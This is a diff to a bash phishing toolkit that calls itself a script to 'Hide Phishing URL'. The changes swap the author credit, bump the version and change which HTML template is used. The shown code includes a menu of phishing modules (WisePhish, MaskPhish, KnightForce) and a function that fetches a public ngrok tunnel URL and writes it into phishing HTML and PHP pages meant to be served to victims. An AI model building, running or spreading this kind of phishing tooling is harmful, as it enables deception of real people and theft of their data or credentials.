@@ -1,6 +1,6 @@
 #!/bin/bash
 # Inspired by: github.com/ALKR-HACKHECKZ/wishfish
-# Modified by: github.com/JamboHS/
+# Modified by: github.com/demboez/
 # Bash Script for Hide Phishing URL Created by KP
 
 trap 'printf "\n";stop' 2
@@ -16,15 +16,15 @@ printf " \e[91m █████╔╝ ██╔██╗ ██║██║█�
 printf " \e[91m ██╔═██╗ ██║╚██╗██║██║██║   ██║██╔══██║   ██║   \e[0m\n"  
 printf " \e[91m ██║  ██╗██║ ╚████║██║╚██████╔╝██║  ██║   ██║   \e[0m\n"  
 printf " \e[91m ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   \e[0m\n"  
-printf "\e[1;77m Version 2.0 \e[0m \n"
-printf "\e[1;77m Coded By JamboHS \e[0m \n"
+printf "\e[1;77m Version 2.2 \e[0m \n"
+printf "\e[1;77m Coded By demboez \e[0m \n"
 printf "\e[1;77m Is it just me or is it getting crazier out there?\e[0m \n"
 }
 
 mainmenu() {
 printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;92m WisePhish \e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;92m MaskPhish \e[0m\n" 
-printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;92m KnightForce \e[0m\n"
+printf "w \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;92m KnightForce \e[0m\n"
 printf " \e[0m\n"        
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Select an option: \e[0m\e[1;91m\en' option
 if [[ $option == 1 || $option == 01 ]]; then
@@ -111,7 +111,7 @@ done
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' wisephish.html > index2.html
+sed 's+forwarding_link+'$link'+g' kphish.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
